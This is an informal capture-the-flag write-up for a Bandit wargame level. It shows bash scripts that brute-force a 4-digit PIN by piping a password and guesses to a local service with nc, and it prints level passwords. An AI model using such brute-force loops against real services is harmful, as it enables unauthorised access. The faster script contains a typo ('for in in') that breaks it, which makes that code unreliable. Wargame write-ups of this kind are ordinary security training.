In this level we know that there is a deamon running on port 30002 and it will give us the password
for the next level if we supply it with the password of bandit24 plus a 4 digit secret pincode
so in order to know that 4 digit pincode we had to bruteforce it 

so we create a small script in bash for bruteforcing the pin and pip that pin with the password of
the current user 

#!/bin/bash

for i in {9999..0000}
do
    echo $i
    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | nc localhost 30002 | grep "Correct"
done

by running this script we get that pincode
and after that we run the command 
echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | nc localhost 30002

to get the password for bandit25
and the password for bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

althought it is very slow process, in order to make it fast what we can do it
just made some changes in out original script to redirect it to a file

#!/bin/bash

for in in {9999..0000}
do
    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
done

and just redirect it to a file
./brute.sh > brute.txt

now just pipe this text file to nc with the command

cat brute.txt | nc localhost 30002

and this will give you the password in a matter of seconds
